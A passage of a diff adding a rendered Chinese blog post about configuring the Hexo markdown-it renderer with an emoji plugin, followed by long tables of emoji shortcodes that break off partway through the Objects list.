+<p>完成插件安装后还需要修改 Hexo 站点配置文件 <code>_config.yml</code>（不是主题配置哦）</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">COPY## markdown 渲染引擎配置，默认是hexo-renderer-marked，这个插件渲染速度更快，且有新特性</span><br><span class="line">markdown:</span><br><span class="line">  render:</span><br><span class="line">    html: true</span><br><span class="line">    xhtmlOut: false</span><br><span class="line">    breaks: true</span><br><span class="line">    linkify: true</span><br><span class="line">    typographer: true</span><br><span class="line">    quotes: &#39;“”‘’&#39;</span><br><span class="line">  plugins:</span><br><span class="line">    - markdown-it-footnote</span><br><span class="line">    - markdown-it-sup</span><br><span class="line">    - markdown-it-sub</span><br><span class="line">    - markdown-it-abbr</span><br><span class="line">    - markdown-it-emoji</span><br><span class="line">  anchors:</span><br><span class="line">    level: 2</span><br><span class="line">    collisionSuffix: &#39;v&#39;</span><br><span class="line">    permalink: true</span><br><span class="line">    permalinkClass: header-anchor</span><br><span class="line">    permalinkSymbol: ¶</span><br></pre></td></tr></table></figure>
+<p>这里需要注意 <code>render:</code> 下的 <code>html:</code> 配置项，它的作用是控制 <code>Markdown</code> 渲染引擎是否转义文档中出现的 <code>html</code> 标签，默认为 <code>false</code> ，这里要设置为 <code>true</code>，否则回导致 <code>&lt;!--more--&gt;</code> 渲染失败。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">COPYhtml: true # 不转义 HTML 内容，即允许 HTML</span><br><span class="line">    ## OR</span><br><span class="line">html: false # 转义 HTML，&lt; &gt; 尖括号会被转义成 &lt; &gt;等</span><br></pre></td></tr></table></figure>
+<p><code>plugins:</code> 中的最后一项 <code>- markdown-it-emoji</code> 是手动添加的，官方 Github Wiki 中给出的配置不包含这一项，其他配置参照的 Github Wiki 中的默认配置，hexo-renderer-markdown-it 提供的其他新特性还没有一一尝试，暂时只想用它的 emoji 功能。✌️</p>
+<h2 id="🌞-使用方法"><a class="header-anchor" href="#🌞-使用方法">¶</a>🌞 使用方法</h2>
+<p>输入对应的emoji编码就行了<br>
+例如：输入笑脸对应的 emoji 编码 <code>:smile:</code> 就可以得到 😄</p>
+<h2 id="🌞-emoji编码合集"><a class="header-anchor" href="#🌞-emoji编码合集">¶</a>🌞 emoji编码合集</h2>
+<p>People</p>
+<table>
+<thead>
+<tr>
+<th style="text-align:left">😐 <code>:neutral_face:</code></th>
+<th style="text-align:left">😄 <code>:smile:</code></th>
+<th style="text-align:left">😆 <code>:laughing:</code></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:left">😊 <code>:blush:</code></td>
+<td style="text-align:left">😃 <code>:smiley:</code></td>
+<td style="text-align:left">☺️ <code>:relaxed:</code></td>
+</tr>
+<tr>
+<td style="text-align:left">😏 <code>:smirk:</code></td>
+<td style="text-align:left">😍 <code>:heart_eyes:</code></td>
+<td style="text-align:left">😘 <code>:kissing_heart:</code></td>
+</tr>
+<tr>
+<td style="text-align:left">😚 <code>:kissing_closed_eyes:</code></td>
+<td style="text-align:left">😳 <code>:flushed:</code></td>
+<td style="text-align:left">😌 <code>:relieved:</code></td>
+</tr>
+<tr>
+<td style="text-align:left">😆 <code>:satisfied:</code></td>
+<td style="text-align:left">😁 <code>:grin:</code></td>
+<td style="text-align:left">😉 <code>:wink:</code></td>
+</tr>
+<tr>
+<td style="text-align:left">😜 <code>:stuck_out_tongue_winking_eye:</code></td>
+<td style="text-align:left">😝 <code>:stuck_out_tongue_closed_eyes:</code></td>
+<td style="text-align:left">😀 <code>:grinning:</code></td>
+</tr>
+<tr>
+<td style="text-align:left">😗 <code>:kissing:</code></td>
+<td style="text-align:left">😙 <code>:kissing_smiling_eyes:</code></td>
+<td style="text-align:left">😛 <code>:stuck_out_tongue:</code></td>
+</tr>
+<tr>
+<td style="text-align:left">😴 <code>:sleeping:</code></td>
+<td style="text-align:left">😟 <code>:worried:</code></td>
+<td style="text-align:left">😦 <code>:frowning:</code></td>
+</tr>
+<tr>
+<td style="text-align:left">😧 <code>:anguished:</code></td>
+<td style="text-align:left">😮 <code>:open_mouth:</code></td>
+<td style="text-align:left">😬 <code>:grimacing:</code></td>
+</tr>
+<tr>
+<td style="text-align:left">😕 <code>:confused:</code></td>
+<td style="text-align:left">😯 <code>:hushed:</code></td>
+<td style="text-align:left">😑 <code>:expressionless:</code></td>
+</tr>
+<tr>
+<td style="text-align:left">😒 <code>:unamused:</code></td>
+<td style="text-align:left">😅 <code>:sweat_smile:</code></td>
+<td style="text-align:left">😓 <code>:sweat:</code></td>
+</tr>
+<tr>
+<td style="text-align:left">😥 <code>:disappointed_relieved:</code></td>
+<td style="text-align:left">😩 <code>:weary:</code></td>
+<td style="text-align:left">😔 <code>:pensive:</code></td>
+</tr>
+<tr>
+<td style="text-align:left">😞 <code>:disappointed:</code></td>
+<td style="text-align:left">😖 <code>:confounded:</code></td>
+<td style="text-align:left">😨 <code>:fearful:</code></td>
+</tr>
+<tr>
+<td style="text-align:left">😰 <code>:cold_sweat:</code></td>
+<td style="text-align:left">😣 <code>:persevere:</code></td>
+<td style="text-align:left">😢 <code>:cry:</code></td>
+</tr>
+<tr>
+<td style="text-align:left">😭 <code>:sob:</code></td>
+<td style="text-align:left">😂 <code>:joy:</code></td>
+<td style="text-align:left">😲 <code>:astonished:</code></td>
+</tr>
+<tr>
+<td style="text-align:left">😱 <code>:scream:</code></td>
+<td style="text-align:left">💭 <code>:thought_balloon:</code></td>
+<td style="text-align:left">😫 <code>:tired_face:</code></td>
+</tr>
+<tr>
+<td style="text-align:left">😠 <code>:angry:</code></td>
+<td style="text-align:left">😡 <code>:rage:</code></td>
+<td style="text-align:left">😤 <code>:triumph:</code></td>
+</tr>
+<tr>
+<td style="text-align:left">😪 <code>:sleepy:</code></td>
+<td style="text-align:left">😋 <code>:yum:</code></td>
+<td style="text-align:left">😷 <code>:mask:</code></td>
+</tr>
+<tr>
+<td style="text-align:left">😎 <code>:sunglasses:</code></td>
+<td style="text-align:left">😵 <code>:dizzy_face:</code></td>
+<td style="text-align:left">👿 <code>:imp:</code></td>
+</tr>
+<tr>
+<td style="text-align:left">😈 <code>:smiling_imp:</code></td>
+<td style="text-align:left">💬 <code>:speech_balloon:</code></td>
+<td style="text-align:left">😶 <code>:no_mouth:</code></td>
+</tr>
+<tr>
+<td style="text-align:left">😇 <code>:innocent:</code></td>
+<td style="text-align:left">👽 <code>:alien:</code></td>
+<td style="text-align:left">💛 <code>:yellow_heart:</code></td>
+</tr>
+<tr>
+<td style="text-align:left">💙 <code>:blue_heart:</code></td>
+<td style="text-align:left">💜 <code>:purple_heart:</code></td>
+<td style="text-align:left">❤️ <code>:heart:</code></td>
+</tr>
+<tr>
+<td style="text-align:left">💚 <code>:green_heart:</code></td>
+<td style="text-align:left">💔 <code>:broken_heart:</code></td>
+<td style="text-align:left">💓 <code>:heartbeat:</code></td>
+</tr>
+<tr>
+<td style="text-align:left">💗 <code>:heartpulse:</code></td>
+<td style="text-align:left">💕 <code>:two_hearts:</code></td>
+<td style="text-align:left">💞 <code>:revolving_hearts:</code></td>
+</tr>
+<tr>
+<td style="text-align:left">💘 <code>:cupid:</code></td>
+<td style="text-align:left">💖 <code>:sparkling_heart:</code></td>
+<td style="text-align:left">✨ <code>:sparkles:</code></td>
+</tr>
+<tr>
+<td style="text-align:left">⭐️ <code>:star:</code></td>
+<td style="text-align:left">🌟 <code>:star2:</code></td>
+<td style="text-align:left">💫 <code>:dizzy:</code></td>
+</tr>
+<tr>
+<td style="text-align:left">💥 <code>:boom:</code></td>
+<td style="text-align:left">💥 <code>:collision:</code></td>
+<td style="text-align:left">💢 <code>:anger:</code></td>
+</tr>
+<tr>
+<td style="text-align:left">❗️ <code>:exclamation:</code></td>
+<td style="text-align:left">❓ <code>:question:</code></td>
+<td style="text-align:left">❕ <code>:grey_exclamation:</code></td>
+</tr>
+<tr>
+<td style="text-align:left">❔ <code>:grey_question:</code></td>
+<td style="text-align:left">💤 <code>:zzz:</code></td>
+<td style="text-align:left">💨 <code>:dash:</code></td>
+</tr>
+<tr>
+<td style="text-align:left">💦 <code>:sweat_drops:</code></td>
+<td style="text-align:left">🎶 <code>:notes:</code></td>
+<td style="text-align:left">🎵 <code>:musical_note:</code></td>
+</tr>
+<tr>
+<td style="text-align:left">🔥 <code>:fire:</code></td>
+<td style="text-align:left">💩 <code>:hankey:</code></td>
+<td style="text-align:left">💩 <code>:poop:</code></td>
+</tr>
+<tr>
+<td style="text-align:left">💩 <code>:shit:</code></td>
+<td style="text-align:left">👍 <code>:+1:</code></td>
+<td style="text-align:left">👍 <code>:thumbsup:</code></td>
+</tr>
+<tr>
+<td style="text-align:left">👎 <code>:-1:</code></td>
+<td style="text-align:left">👎 <code>:thumbsdown:</code></td>
+<td style="text-align:left">👌 <code>:ok_hand:</code></td>
+</tr>
+<tr>
+<td style="text-align:left">👊 <code>:punch:</code></td>
+<td style="text-align:left">👊 <code>:facepunch:</code></td>
+<td style="text-align:left">✊ <code>:fist:</code></td>
+</tr>
+<tr>
+<td style="text-align:left">✌️ <code>:v:</code></td>
+<td style="text-align:left">👋 <code>:wave:</code></td>
+<td style="text-align:left">✋ <code>:hand:</code></td>
+</tr>
+<tr>
+<td style="text-align:left">✋ <code>:raised_hand:</code></td>
+<td style="text-align:left">👐 <code>:open_hands:</code></td>
+<td style="text-align:left">☝️ <code>:point_up:</code></td>
+</tr>
+<tr>
+<td style="text-align:left">👇 <code>:point_down:</code></td>
+<td style="text-align:left">👈 <code>:point_left:</code></td>
+<td style="text-align:left">👉 <code>:point_right:</code></td>
+</tr>
+<tr>
+<td style="text-align:left">🙌 <code>:raised_hands:</code></td>
+<td style="text-align:left">🙏 <code>:pray:</code></td>
+<td style="text-align:left">👆 <code>:point_up_2:</code></td>
+</tr>
+<tr>
+<td style="text-align:left">👏 <code>:clap:</code></td>
+<td style="text-align:left">💪 <code>:muscle:</code></td>
+<td style="text-align:left">🤘 <code>:metal:</code></td>
+</tr>
+<tr>
+<td style="text-align:left">🖕 <code>:fu:</code></td>
+<td style="text-align:left">🚶 <code>:walking:</code></td>
+<td style="text-align:left">🏃 <code>:runner:</code></td>
+</tr>
+<tr>
+<td style="text-align:left">🏃 <code>:running:</code></td>
+<td style="text-align:left">👫 <code>:couple:</code></td>
+<td style="text-align:left">👪 <code>:family:</code></td>
+</tr>
+<tr>
+<td style="text-align:left">👬 <code>:two_men_holding_hands:</code></td>
+<td style="text-align:left">👭 <code>:two_women_holding_hands:</code></td>
+<td style="text-align:left">💃 <code>:dancer:</code></td>
+</tr>
+<tr>
+<td style="text-align:left">👯 <code>:dancers:</code></td>
+<td style="text-align:left">🙆 <code>:ok_woman:</code></td>
+<td style="text-align:left">🙅 <code>:no_good:</code></td>
+</tr>
+<tr>
+<td style="text-align:left">💁 <code>:information_desk_person:</code></td>
+<td style="text-align:left">🙋 <code>:raising_hand:</code></td>
+<td style="text-align:left">👰 <code>:bride_with_veil:</code></td>
+</tr>
+<tr>
+<td style="text-align:left">🙎 <code>:person_with_pouting_face:</code></td>
+<td style="text-align:left">🙍 <code>:person_frowning:</code></td>
+<td style="text-align:left">🙇 <code>:bow:</code></td>
+</tr>
+<tr>
+<td style="text-align:left">:couplekiss: <code>:couplekiss:</code></td>
+<td style="text-align:left">💑 <code>:couple_with_heart:</code></td>
+<td style="text-align:left">💆 <code>:massage:</code></td>
+</tr>
+<tr>
+<td style="text-align:left">💇 <code>:haircut:</code></td>
+<td style="text-align:left">💅 <code>:nail_care:</code></td>
+<td style="text-align:left">👦 <code>:boy:</code></td>
+</tr>
+<tr>
+<td style="text-align:left">👧 <code>:girl:</code></td>
+<td style="text-align:left">👩 <code>:woman:</code></td>
+<td style="text-align:left">👨 <code>:man:</code></td>
+</tr>
+<tr>
+<td style="text-align:left">👶 <code>:baby:</code></td>
+<td style="text-align:left">👵 <code>:older_woman:</code></td>
+<td style="text-align:left">👴 <code>:older_man:</code></td>
+</tr>
+<tr>
+<td style="text-align:left">👱 <code>:person_with_blond_hair:</code></td>
+<td style="text-align:left">👲 <code>:man_with_gua_pi_mao:</code></td>
+<td style="text-align:left">👳 <code>:man_with_turban:</code></td>
+</tr>
+<tr>
+<td style="text-align:left">👷 <code>:construction_worker:</code></td>
+<td style="text-align:left">👮 <code>:cop:</code></td>
+<td style="text-align:left">👼 <code>:angel:</code></td>
+</tr>
+<tr>
+<td style="text-align:left">👸 <code>:princess:</code></td>
+<td style="text-align:left">😺 <code>:smiley_cat:</code></td>
+<td style="text-align:left">😸 <code>:smile_cat:</code></td>
+</tr>
+<tr>
+<td style="text-align:left">😻 <code>:heart_eyes_cat:</code></td>
+<td style="text-align:left">😽 <code>:kissing_cat:</code></td>
+<td style="text-align:left">😼 <code>:smirk_cat:</code></td>
+</tr>
+<tr>
+<td style="text-align:left">🙀 <code>:scream_cat:</code></td>
+<td style="text-align:left">😿 <code>:crying_cat_face:</code></td>
+<td style="text-align:left">😹 <code>:joy_cat:</code></td>
+</tr>
+<tr>
+<td style="text-align:left">😾 <code>:pouting_cat:</code></td>
+<td style="text-align:left">👹 <code>:japanese_ogre:</code></td>
+<td style="text-align:left">👺 <code>:japanese_goblin:</code></td>
+</tr>
+<tr>
+<td style="text-align:left">🙈 <code>:see_no_evil:</code></td>
+<td style="text-align:left">🙉 <code>:hear_no_evil:</code></td>
+<td style="text-align:left">🙊 <code>:speak_no_evil:</code></td>
+</tr>
+<tr>
+<td style="text-align:left">💂 <code>:guardsman:</code></td>
+<td style="text-align:left">💀 <code>:skull:</code></td>
+<td style="text-align:left">🐾 <code>:feet:</code></td>
+</tr>
+<tr>
+<td style="text-align:left">👄 <code>:lips:</code></td>
+<td style="text-align:left">💋 <code>:kiss:</code></td>
+<td style="text-align:left">💧 <code>:droplet:</code></td>
+</tr>
+<tr>
+<td style="text-align:left">👂 <code>:ear:</code></td>
+<td style="text-align:left">👀 <code>:eyes:</code></td>
+<td style="text-align:left">👃 <code>:nose:</code></td>
+</tr>
+<tr>
+<td style="text-align:left">👅 <code>:tongue:</code></td>
+<td style="text-align:left">💌 <code>:love_letter:</code></td>
+<td style="text-align:left">👤 <code>:bust_in_silhouette:</code></td>
+</tr>
+<tr>
+<td style="text-align:left">👥 <code>:busts_in_silhouette:</code></td>
+<td style="text-align:left"></td>
+<td style="text-align:left"></td>
+</tr>
+</tbody>
+</table>
+<p>Nature</p>
+<table>
+<thead>
+<tr>
+<th style="text-align:left">☀️ <code>:sunny:</code></th>
+<th style="text-align:left">☔️ <code>:umbrella:</code></th>
+<th style="text-align:left">☁️ <code>:cloud:</code></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:left">❄️ <code>:snowflake:</code></td>
+<td style="text-align:left">⛄️ <code>:snowman:</code></td>
+<td style="text-align:left">⚡️ <code>:zap:</code></td>
+</tr>
+<tr>
+<td style="text-align:left">🌀 <code>:cyclone:</code></td>
+<td style="text-align:left">🌁 <code>:foggy:</code></td>
+<td style="text-align:left">🌊 <code>:ocean:</code></td>
+</tr>
+<tr>
+<td style="text-align:left">🐱 <code>:cat:</code></td>
+<td style="text-align:left">🐶 <code>:dog:</code></td>
+<td style="text-align:left">🐭 <code>:mouse:</code></td>
+</tr>
+<tr>
+<td style="text-align:left">🐹 <code>:hamster:</code></td>
+<td style="text-align:left">🐰 <code>:rabbit:</code></td>
+<td style="text-align:left">🐺 <code>:wolf:</code></td>
+</tr>
+<tr>
+<td style="text-align:left">🐸 <code>:frog:</code></td>
+<td style="text-align:left">🐯 <code>:tiger:</code></td>
+<td style="text-align:left">🐨 <code>:koala:</code></td>
+</tr>
+<tr>
+<td style="text-align:left">🐻 <code>:bear:</code></td>
+<td style="text-align:left">🐷 <code>:pig:</code></td>
+<td style="text-align:left">🐽 <code>:pig_nose:</code></td>
+</tr>
+<tr>
+<td style="text-align:left">🐮 <code>:cow:</code></td>
+<td style="text-align:left">🐗 <code>:boar:</code></td>
+<td style="text-align:left">🐵 <code>:monkey_face:</code></td>
+</tr>
+<tr>
+<td style="text-align:left">🐒 <code>:monkey:</code></td>
+<td style="text-align:left">🐴 <code>:horse:</code></td>
+<td style="text-align:left">🐎 <code>:racehorse:</code></td>
+</tr>
+<tr>
+<td style="text-align:left">🐫 <code>:camel:</code></td>
+<td style="text-align:left">🐑 <code>:sheep:</code></td>
+<td style="text-align:left">🐘 <code>:elephant:</code></td>
+</tr>
+<tr>
+<td style="text-align:left">🐼 <code>:panda_face:</code></td>
+<td style="text-align:left">🐍 <code>:snake:</code></td>
+<td style="text-align:left">🐦 <code>:bird:</code></td>
+</tr>
+<tr>
+<td style="text-align:left">🐤 <code>:baby_chick:</code></td>
+<td style="text-align:left">🐥 <code>:hatched_chick:</code></td>
+<td style="text-align:left">🐣 <code>:hatching_chick:</code></td>
+</tr>
+<tr>
+<td style="text-align:left">🐔 <code>:chicken:</code></td>
+<td style="text-align:left">🐧 <code>:penguin:</code></td>
+<td style="text-align:left">🐢 <code>:turtle:</code></td>
+</tr>
+<tr>
+<td style="text-align:left">🐛 <code>:bug:</code></td>
+<td style="text-align:left">🐝 <code>:honeybee:</code></td>
+<td style="text-align:left">🐜 <code>:ant:</code></td>
+</tr>
+<tr>
+<td style="text-align:left">🐞 <code>:beetle:</code></td>
+<td style="text-align:left">🐌 <code>:snail:</code></td>
+<td style="text-align:left">🐙 <code>:octopus:</code></td>
+</tr>
+<tr>
+<td style="text-align:left">🐠 <code>:tropical_fish:</code></td>
+<td style="text-align:left">🐟 <code>:fish:</code></td>
+<td style="text-align:left">🐳 <code>:whale:</code></td>
+</tr>
+<tr>
+<td style="text-align:left">🐋 <code>:whale2:</code></td>
+<td style="text-align:left">🐬 <code>:dolphin:</code></td>
+<td style="text-align:left">🐄 <code>:cow2:</code></td>
+</tr>
+<tr>
+<td style="text-align:left">🐏 <code>:ram:</code></td>
+<td style="text-align:left">🐀 <code>:rat:</code></td>
+<td style="text-align:left">🐃 <code>:water_buffalo:</code></td>
+</tr>
+<tr>
+<td style="text-align:left">🐅 <code>:tiger2:</code></td>
+<td style="text-align:left">🐇 <code>:rabbit2:</code></td>
+<td style="text-align:left">🐉 <code>:dragon:</code></td>
+</tr>
+<tr>
+<td style="text-align:left">🐐 <code>:goat:</code></td>
+<td style="text-align:left">🐓 <code>:rooster:</code></td>
+<td style="text-align:left">🐕 <code>:dog2:</code></td>
+</tr>
+<tr>
+<td style="text-align:left">🐖 <code>:pig2:</code></td>
+<td style="text-align:left">🐁 <code>:mouse2:</code></td>
+<td style="text-align:left">🐂 <code>:ox:</code></td>
+</tr>
+<tr>
+<td style="text-align:left">🐲 <code>:dragon_face:</code></td>
+<td style="text-align:left">🐡 <code>:blowfish:</code></td>
+<td style="text-align:left">🐊 <code>:crocodile:</code></td>
+</tr>
+<tr>
+<td style="text-align:left">🐪 <code>:dromedary_camel:</code></td>
+<td style="text-align:left">🐆 <code>:leopard:</code></td>
+<td style="text-align:left">🐈 <code>:cat2:</code></td>
+</tr>
+<tr>
+<td style="text-align:left">🐩 <code>:poodle:</code></td>
+<td style="text-align:left">🐾 <code>:paw_prints:</code></td>
+<td style="text-align:left">💐 <code>:bouquet:</code></td>
+</tr>
+<tr>
+<td style="text-align:left">🌸 <code>:cherry_blossom:</code></td>
+<td style="text-align:left">🌷 <code>:tulip:</code></td>
+<td style="text-align:left">🍀 <code>:four_leaf_clover:</code></td>
+</tr>
+<tr>
+<td style="text-align:left">🌹 <code>:rose:</code></td>
+<td style="text-align:left">🌻 <code>:sunflower:</code></td>
+<td style="text-align:left">🌺 <code>:hibiscus:</code></td>
+</tr>
+<tr>
+<td style="text-align:left">🍁 <code>:maple_leaf:</code></td>
+<td style="text-align:left">🍃 <code>:leaves:</code></td>
+<td style="text-align:left">🍂 <code>:fallen_leaf:</code></td>
+</tr>
+<tr>
+<td style="text-align:left">🌿 <code>:herb:</code></td>
+<td style="text-align:left">🍄 <code>:mushroom:</code></td>
+<td style="text-align:left">🌵 <code>:cactus:</code></td>
+</tr>
+<tr>
+<td style="text-align:left">🌴 <code>:palm_tree:</code></td>
+<td style="text-align:left">🌲 <code>:evergreen_tree:</code></td>
+<td style="text-align:left">🌳 <code>:deciduous_tree:</code></td>
+</tr>
+<tr>
+<td style="text-align:left">🌰 <code>:chestnut:</code></td>
+<td style="text-align:left">🌱 <code>:seedling:</code></td>
+<td style="text-align:left">🌼 <code>:blossom:</code></td>
+</tr>
+<tr>
+<td style="text-align:left">🌾 <code>:ear_of_rice:</code></td>
+<td style="text-align:left">🐚 <code>:shell:</code></td>
+<td style="text-align:left">🌐 <code>:globe_with_meridians:</code></td>
+</tr>
+<tr>
+<td style="text-align:left">🌞 <code>:sun_with_face:</code></td>
+<td style="text-align:left">🌝 <code>:full_moon_with_face:</code></td>
+<td style="text-align:left">🌚 <code>:new_moon_with_face:</code></td>
+</tr>
+<tr>
+<td style="text-align:left">🌑 <code>:new_moon:</code></td>
+<td style="text-align:left">🌒 <code>:waxing_crescent_moon:</code></td>
+<td style="text-align:left">🌓 <code>:first_quarter_moon:</code></td>
+</tr>
+<tr>
+<td style="text-align:left">🌔 <code>:waxing_gibbous_moon:</code></td>
+<td style="text-align:left">🌕 <code>:full_moon:</code></td>
+<td style="text-align:left">🌖 <code>:waning_gibbous_moon:</code></td>
+</tr>
+<tr>
+<td style="text-align:left">🌗 <code>:last_quarter_moon:</code></td>
+<td style="text-align:left">🌘 <code>:waning_crescent_moon:</code></td>
+<td style="text-align:left">🌜 <code>:last_quarter_moon_with_face:</code></td>
+</tr>
+<tr>
+<td style="text-align:left">🌛 <code>:first_quarter_moon_with_face:</code></td>
+<td style="text-align:left">🌔 <code>:moon:</code></td>
+<td style="text-align:left">🌍 <code>:earth_africa:</code></td>
+</tr>
+<tr>
+<td style="text-align:left">🌎 <code>:earth_americas:</code></td>
+<td style="text-align:left">🌏 <code>:earth_asia:</code></td>
+<td style="text-align:left">🌋 <code>:volcano:</code></td>
+</tr>
+<tr>
+<td style="text-align:left">🌌 <code>:milky_way:</code></td>
+<td style="text-align:left">⛅️ <code>:partly_sunny:</code></td>
+<td style="text-align:left"></td>
+</tr>
+</tbody>
+</table>
+<p>Objects</p>
+<table>
+<thead>
+<tr>
+<th style="text-align:left">🎍 <code>:bamboo:</code></th>
+<th style="text-align:left">💝 <code>:gift_heart:</code></th>
+<th style="text-align:left">🎎 <code>:dolls:</code></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:left">🎒 <code>:school_satchel:</code></td>
+<td style="text-align:left">🎓 <code>:mortar_board:</code></td>
+<td style="text-align:left">🎏 <code>:flags:</code></td>
+</tr>
+<tr>
+<td style="text-align:left">🎆 <code>:fireworks:</code></td>
+<td style="text-align:left">🎇 <code>:sparkler:</code></td>
+<td style="text-align:left">🎐 <code>:wind_chime:</code></td>
+</tr>
+<tr>
+<td style="text-align:left">🎑 <code>:rice_scene:</code></td>
+<td style="text-align:left">🎃 <code>:jack_o_lantern:</code></td>
+<td style="text-align:left">👻 <code>:ghost:</code></td>
+</tr>
+<tr>
+<td style="text-align:left">🎅 <code>:santa:</code></td>
+<td style="text-align:left">🎄 <code>:christmas_tree:</code></td>
+<td style="text-align:left">🎁 <code>:gift:</code></td>
+</tr>
+<tr>
+<td style="text-align:left">🔔 <code>:bell:</code></td>
+<td style="text-align:left">🔕 <code>:no_bell:</code></td>
+<td style="text-align:left">🎋 <code>:tanabata_tree:</code></td>
+</tr>
+<tr>
+<td style="text-align:left">🎉 <code>:tada:</code></td>
+<td style="text-align:left">🎊 <code>:confetti_ball:</code></td>
+<td style="text-align:left">🎈 <code>:balloon:</code></td>
+</tr>
+<tr>
+<td style="text-align:left">🔮 <code>:crystal_ball:</code></td>
+<td style="text-align:left">💿 <code>:cd:</code></td>
+<td style="text-align:left">📀 <code>:dvd:</code></td>
+</tr>
+<tr>
+<td style="text-align:left">💾 <code>:floppy_disk:</code></td>
+<td style="text-align:left">📷 <code>:camera:</code></td>
+<td style="text-align:left">📹 <code>:video_camera:</code></td>
+</tr>
+<tr>
+<td style="text-align:left">🎥 <code>:movie_camera:</code></td>
+<td style="text-align:left">💻 <code>:computer:</code></td>
+<td style="text-align:left">📺 <code>:tv:</code></td>
+</tr>
+<tr>
+<td style="text-align:left">📱 <code>:iphone:</code></td>
+<td style="text-align:left">☎️ <code>:phone:</code></td>
+<td style="text-align:left">☎️ <code>:telephone:</code></td>
+</tr>
+<tr>
+<td style="text-align:left">📞 <code>:telephone_receiver:</code></td>
+<td style="text-align:left">📟 <code>:pager:</code></td>
+<td style="text-align:left">📠 <code>:fax:</code></td>
+</tr>
+<tr>
+<td style="text-align:left">💽 <code>:minidisc:</code></td>
+<td style="text-align:left">📼 <code>:vhs:</code></td>
+<td style="text-align:left">🔉 <code>:sound:</code></td>
+</tr>
+<tr>
+<td style="text-align:left">🔈 <code>:speaker:</code></td>
+<td style="text-align:left">🔇 <code>:mute:</code></td>
+<td style="text-align:left">📢 <code>:loudspeaker:</code></td>
+</tr>
+<tr>
+<td style="text-align:left">📣 <code>:mega:</code></td>
+<td style="text-align:left">⌛️ <code>:hourglass:</code></td>
+<td style="text-align:left">⏳ <code>:hourglass_flowing_sand:</code></td>
+</tr>
+<tr>
+<td style="text-align:left">⏰ <code>:alarm_clock:</code></td>
+<td style="text-align:left">⌚️ <code>:watch:</code></td>
+<td style="text-align:left">📻 <code>:radio:</code></td>
+</tr>
+<tr>
+<td style="text-align:left">📡 <code>:satellite:</code></td>
+<td style="text-align:left">➿ <code>:loop:</code></td>
+<td style="text-align:left">🔍 <code>:mag:</code></td>
+</tr>
+<tr>
+<td style="text-align:left">🔎 <code>:mag_right:</code></td>
+<td style="text-align:left">🔓 <code>:unlock:</code></td>
+<td style="text-align:left">🔒 <code>:lock:</code></td>
+</tr>
+<tr>
+<td style="text-align:left">🔏 <code>:lock_with_ink_pen:</code></td>
+<td style="text-align:left">🔐 <code>:closed_lock_with_key:</code></td>
+<td style="text-align:left">🔑 <code>:key:</code></td>
+</tr>
+<tr>
+<td style="text-align:left">💡 <code>:bulb:</code></td>
+<td style="text-align:left">🔦 <code>:flashlight:</code></td>
+<td style="text-align:left">🔆 <code>:high_brightness:</code></td>
+</tr>
+<tr>
+<td style="text-align:left">🔅 <code>:low_brightness:</code></td>
+<td style="text-align:left">🔌 <code>:electric_plug:</code></td>
+<td style="text-align:left">🔋 <code>:battery:</code></td>
+</tr>
+<tr>
+<td style="text-align:left">📲 <code>:calling:</code></td>
+<td style="text-align:left">✉️ <code>:email:</code></td>
+<td style="text-align:left">📫 <code>:mailbox:</code></td>
+</tr>
+<tr>
+<td style="text-align:left">📮 <code>:postbox:</code></td>
+<td style="text-align:left">🛀 <code>:bath:</code></td>
+<td style="text-align:left">🛁 <code>:bathtub:</code></td>
+</tr>
+<tr>
+<td style="text-align:left">🚿 <code>:shower:</code></td>
+<td style="text-align:left">🚽 <code>:toilet:</code></td>
+<td style="text-align:left">🔧 <code>:wrench:</code></td>
+</tr>
+<tr>
+<td style="text-align:left">🔩 <code>:nut_and_bolt:</code></td>
+<td style="text-align:left">🔨 <code>:hammer:</code></td>
+<td style="text-align:left">💺 <code>:seat:</code></td>
+</tr>
+<tr>
+<td style="text-align:left">💰 <code>:moneybag:</code></td>
+<td style="text-align:left">💴 <code>:yen:</code></td>
+<td style="text-align:left">💵 <code>:dollar:</code></td>
+</tr>
+<tr>
+<td style="text-align:left">💷 <code>:pound:</code></td>
+<td style="text-align:left">💶 <code>:euro:</code></td>
+<td style="text-align:left">💳 <code>:credit_card:</code></td>
+</tr>
+<tr>
+<td style="text-align:left">💸 <code>:money_with_wings:</code></td>
+<td style="text-align:left">📧 <code>:e-mail:</code></td>
+<td style="text-align:left">📥 <code>:inbox_tray:</code></td>
+</tr>
+<tr>
+<td style="text-align:left">📤 <code>:outbox_tray:</code></td>
+<td style="text-align:left">✉️ <code>:envelope:</code></td>
+<td style="text-align:left">📨 <code>:incoming_envelope:</code></td>
+</tr>
+<tr>
+<td style="text-align:left">📯 <code>:postal_horn:</code></td>
+<td style="text-align:left">📪 <code>:mailbox_closed:</code></td>
+<td style="text-align:left">📬 <code>:mailbox_with_mail:</code></td>
+</tr>
+<tr>
+<td style="text-align:left">📭 <code>:mailbox_with_no_mail:</code></td>
+<td style="text-align:left">🚪 <code>:door:</code></td>
+<td style="text-align:left">🚬 <code>:smoking:</code></td>
+</tr>
+<tr>
+<td style="text-align:left">💣 <code>:bomb:</code></td>
+<td style="text-align:left">🔫 <code>:gun:</code></td>
+<td style="text-align:left">🔪 <code>:hocho:</code></td>
+</tr>
+<tr>
+<td style="text-align:left">💊 <code>:pill:</code></td>
+<td style="text-align:left">💉 <code>:syringe:</code></td>
+<td style="text-align:left">📄 <code>:page_facing_up:</code></td>
+</tr>
+<tr>
+<td style="text-align:left">📃 <code>:page_with_curl:</code></td>
+<td style="text-align:left">📑 <code>:bookmark_tabs:</code></td>
+<td style="text-align:left">📊 <code>:bar_chart:</code></td>
+</tr>
+<tr>
+<td style="text-align:left">📈 <code>:chart_with_upwards_trend:</code></td>
+<td style="text-align:left">📉 <code>:chart_with_downwards_trend:</code></td>
+<td style="text-align:left">📜 <code>:scroll:</code></td>
+</tr>
+<tr>
+<td style="text-align:left">📋 <code>:clipboard:</code></td>
+<td style="text-align:left">📆 <code>:calendar:</code></td>
+<td style="text-align:left">📅 <code>:date:</code></td>
+</tr>
+<tr>
+<td style="text-align:left">📇 <code>:card_index:</code></td>
+<td style="text-align:left">📁 <code>:file_folder:</code></td>
+<td style="text-align:left">📂 <code>:open_file_folder:</code></td>
+</tr>
+<tr>
+<td style="text-align:left">✂️ <code>:scissors:</code></td>
